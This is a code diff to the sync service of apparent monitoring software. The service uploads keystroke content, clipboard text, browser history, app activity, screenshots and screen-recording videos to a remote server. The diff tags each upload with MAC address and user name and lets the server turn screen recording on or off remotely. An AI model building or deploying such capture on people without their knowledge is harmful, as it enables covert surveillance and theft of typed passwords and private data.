@@ -65,13 +65,21 @@ class SyncService:
 
     # ─── IDENTITY ────────────────────────────────────────────────────────────
 
-    def _get_pc_name(self) -> str:
+    def _get_identity(self) -> dict:
         try:
             config = self.db_manager.get_identity_config()
-            return config.get("device_alias") or self._fallback_hostname
+            return {
+                "pcName":     config.get("device_alias") or self._fallback_hostname,
+                "macAddress": config.get("mac_address", ""),
+                "userName":   config.get("user_alias") or config.get("os_user", ""),
+            }
         except Exception as e:
-            logger.warning("Could not read device_alias: %s — using hostname", e)
-            return self._fallback_hostname
+            logger.warning("Could not read identity config: %s — using fallback", e)
+            return {
+                "pcName":     self._fallback_hostname,
+                "macAddress": "",
+                "userName":   "",
+            }
 
     # ─── LIFECYCLE ───────────────────────────────────────────────────────────
 
@@ -100,14 +108,14 @@ class SyncService:
         logger.info("Manual sync triggered")
         try:
             self._is_syncing = True
-            pc_name = self._get_pc_name()
+            identity = self._get_identity()
             results = {
-                "app_activity": self._sync_app_activity(pc_name),
-                "browser":      self._sync_browser(pc_name),
-                "clipboard":    self._sync_clipboard(pc_name),
-                "keystrokes":   self._sync_keystrokes(pc_name),
-                "screenshots":  self._sync_screenshots(pc_name),
-                "videos":       self._sync_videos(pc_name),
+                "app_activity": self._sync_app_activity(identity),
+                "browser":      self._sync_browser(identity),
+                "clipboard":    self._sync_clipboard(identity),
+                "keystrokes":   self._sync_keystrokes(identity),
+                "screenshots":  self._sync_screenshots(identity),
+                "videos":       self._sync_videos(identity),
             }
             self._last_sync_time  = datetime.now(timezone.utc).isoformat()
             self._last_sync_error = None
@@ -126,13 +134,14 @@ class SyncService:
         while self.is_running:
             try:
                 self._is_syncing = True
-                pc_name = self._get_pc_name()
-                self._sync_app_activity(pc_name)
-                self._sync_browser(pc_name)
-                self._sync_clipboard(pc_name)
-                self._sync_keystrokes(pc_name)
-                self._sync_screenshots(pc_name)
-                self._sync_videos(pc_name)
+                identity = self._get_identity()
+                self._sync_video_status(identity)
+                self._sync_app_activity(identity)
+                self._sync_browser(identity)
+                self._sync_clipboard(identity)
+                self._sync_keystrokes(identity)
+                self._sync_screenshots(identity)
+                self._sync_videos(identity)
                 self._last_sync_time  = datetime.now(timezone.utc).isoformat()
                 self._last_sync_error = None
             except Exception as e:
@@ -226,7 +235,7 @@ class SyncService:
 
     # ─── TYPE 1 — APP ACTIVITY ───────────────────────────────────────────────
 
-    def _sync_app_activity(self, pc_name: str) -> int:
+    def _sync_app_activity(self, identity: dict) -> int:
         url = self._get_url("url_app_activity")
         if not url:
             return 0
@@ -237,7 +246,7 @@ class SyncService:
 
         synced_ids = []
         for rec in records:
-            payload = self._build_app_activity_payload(rec, pc_name)
+            payload = self._build_app_activity_payload(rec, identity)
             if payload is None:
                 continue
             if self._post_json(url, payload):
@@ -250,7 +259,7 @@ class SyncService:
             logger.info("app_activity: synced %d records", len(synced_ids))
         return len(synced_ids)
 
-    def _build_app_activity_payload(self, rec: dict, pc_name: str) -> dict | None:
+    def _build_app_activity_payload(self, rec: dict, identity: dict) -> dict | None:
         try:
             start_dt = datetime.fromisoformat(rec["timestamp"])
             if start_dt.tzinfo is None:
@@ -258,7 +267,9 @@ class SyncService:
             duration = int(rec.get("duration_seconds") or 0)
             end_dt   = start_dt + timedelta(seconds=duration)
             return {
-                "pcName":       pc_name,
+                "pcName":       identity["pcName"],
+                "macAddress":   identity["macAddress"],
+                "userName":     identity["userName"],
                 "appName":      rec.get("app_name") or "Unknown",
                 "windowsTitle": rec.get("window_title") or "",
                 "startTime":    start_dt.isoformat(),
@@ -272,7 +283,7 @@ class SyncService:
 
     # ─── TYPE 2 — BROWSER ACTIVITY ───────────────────────────────────────────
 
-    def _sync_browser(self, pc_name: str) -> int:
+    def _sync_browser(self, identity: dict) -> int:
         url = self._get_url("url_browser")
         if not url:
             return 0
@@ -284,7 +295,9 @@ class SyncService:
         synced_ids = []
         for rec in records:
             payload = {
-                "pcName":      pc_name,
+                "pcName":      identity["pcName"],
+                "macAddress":  identity["macAddress"],
+                "userName":    identity["userName"],
                 "browserName": rec.get("browser_name") or "",
                 "url":         rec.get("url") or "",
                 "pageTitle":   rec.get("page_title") or "",
@@ -303,7 +316,7 @@ class SyncService:
 
     # ─── TYPE 3 — CLIPBOARD ──────────────────────────────────────────────────
 
-    def _sync_clipboard(self, pc_name: str) -> int:
+    def _sync_clipboard(self, identity: dict) -> int:
         url = self._get_url("url_clipboard")
         if not url:
             return 0
@@ -315,7 +328,9 @@ class SyncService:
         synced_ids = []
         for rec in records:
             payload = {
-                "pcName":         pc_name,
+                "pcName":         identity["pcName"],
+                "macAddress":     identity["macAddress"],
+                "userName":       identity["userName"],
                 "contentType":    rec.get("content_type") or "text",
                 "contentPreview": rec.get("content_preview") or "",
                 "timestamp":      self._normalize_timestamp(rec.get("timestamp") or ""),
@@ -333,7 +348,7 @@ class SyncService:
 
     # ─── TYPE 4 — KEYSTROKES ─────────────────────────────────────────────────
 
-    def _sync_keystrokes(self, pc_name: str) -> int:
+    def _sync_keystrokes(self, identity: dict) -> int:
         url = self._get_url("url_keystrokes")
         if not url:
             return 0
@@ -345,7 +360,9 @@ class SyncService:
         synced_ids = []
         for rec in records:
             payload = {
-                "pcName":      pc_name,
+                "pcName":      identity["pcName"],
+                "macAddress":  identity["macAddress"],
+                "userName":    identity["userName"],
                 "application": rec.get("application") or "",
                 "windowTitle": rec.get("window_title") or "",
                 "content":     rec.get("content") or "",
@@ -364,7 +381,7 @@ class SyncService:
 
     # ─── TYPE 5 — SCREENSHOTS ────────────────────────────────────────────────
 
-    def _sync_screenshots(self, pc_name: str) -> int:
+    def _sync_screenshots(self, identity: dict) -> int:
         url = self._get_url("url_screenshots")
         if not url:
             return 0
@@ -377,7 +394,9 @@ class SyncService:
         for rec in records:
             file_path = rec.get("file_path") or ""
             fields = {
-                "pcName":       pc_name,
+                "pcName":       identity["pcName"],
+                "macAddress":   identity["macAddress"],
+                "userName":     identity["userName"],
                 "timestamp":    rec.get("timestamp") or "",
                 "activeWindow": rec.get("active_window") or "",
                 "activeApp":    rec.get("active_app") or "",
@@ -402,7 +421,7 @@ class SyncService:
 
     # ─── TYPE 6 — VIDEOS ─────────────────────────────────────────────────────
 
-    def _sync_videos(self, pc_name: str) -> int:
+    def _sync_videos(self, identity: dict) -> int:
         """
         Sends each video chunk as multipart/form-data.
 
@@ -437,7 +456,9 @@ class SyncService:
             file_path = rec.get("file_path") or ""
 
             fields = {
-                "pcName":          pc_name,
+                "pcName":          identity["pcName"],
+                "macAddress":      identity["macAddress"],
+                "userName":        identity["userName"],
                 "timestamp":       rec.get("timestamp") or "",
                 # ── FIX: was str(...), now int() — semantically correct ───────
                 "durationSeconds": int(rec.get("duration_seconds") or 0),
@@ -459,3 +480,31 @@ class SyncService:
             self.db_manager.mark_videos_synced(synced_ids)
             logger.info("videos: synced %d records", len(synced_ids))
         return len(synced_ids)
+
+    def _sync_video_status(self, identity: dict) -> None:
+        base_url = self.config_manager.get("base_url")
+        if not base_url:
+            return
+        
+        url = f"{base_url.rstrip('/')}/api/settings/video-recording?pcName={identity['pcName']}&macAddress={identity['macAddress']}&userName={identity['userName']}"
+        try:
+            resp = requests.get(
+                url, headers=self._auth_headers(), timeout=10
+            )
+            if resp.ok:
+                data = resp.json()
+                remote_enabled = data.get("recordingEnabled")
+                if remote_enabled is not None:
+                    local_enabled = self.config_manager.get("recording_enabled", False)
+                    if bool(remote_enabled) != bool(local_enabled):
+                        self.config_manager.set("recording_enabled", bool(remote_enabled))
+                        from monitoring import screen_recorder
+                        if remote_enabled:
+                            screen_recorder.start()
+                            logger.info("Screen recording ENABLED by remote server sync")
+                        else:
+                            screen_recorder.stop()
+                            logger.info("Screen recording DISABLED by remote server sync")
+        except Exception as e:
+            logger.debug("Failed to sync video status from remote: %s", e)
+
